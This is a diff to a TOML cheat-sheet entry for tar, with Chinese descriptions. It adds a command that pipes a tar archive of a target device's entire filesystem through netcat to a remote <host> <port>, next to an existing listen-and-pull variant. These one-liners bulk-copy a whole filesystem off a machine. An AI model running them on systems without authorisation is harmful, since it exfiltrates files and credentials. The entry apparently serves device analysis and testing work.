@@ -1,7 +1,12 @@
 examples = []
+
 [[hit]]
 command = "tar cvhf - --exclude=/proc --exclude=/sys --exclude=/dev --exclude=/tmp --exclude=/lost+found --exclude=/media --exclude=/mnt --exclude=/selinux --exclude=/var/cache --exclude=/var/tmp / | nc -l -p port"
-description = "在目标设备上，使用 tar 将 filesystem 通过 tar + nc 的方式监听在 9999 端口，然后可在其他设备上执行 `nc host port > fs.tar` 来传输 fs，适用于目标系统内部空间不足的情况"
+description = "在目标设备上，使用 tar 将 filesystem 通过 tar + nc 的方式监听在 port 端口，然后可在其他设备上执行 `nc host port > fs.tar` 来传输 fs，适用于目标系统内部空间不足的情况"
+
+[[hit]]
+command = "tar cvhf - --exclude=/proc --exclude=/sys --exclude=/dev --exclude=/tmp --exclude=/lost+found --exclude=/media --exclude=/mnt --exclude=/selinux --exclude=/var/cache --exclude=/var/tmp / | nc <host> <port>"
+description = "（反过来）在其他设备上执行 `nc -nvlkp <port> | cat > fs.tar`，在目标设备上，使用 tar 将 filesystem 通过 tar + nc 的方式传输到端口"
 
 [meta]
 name = "tar"
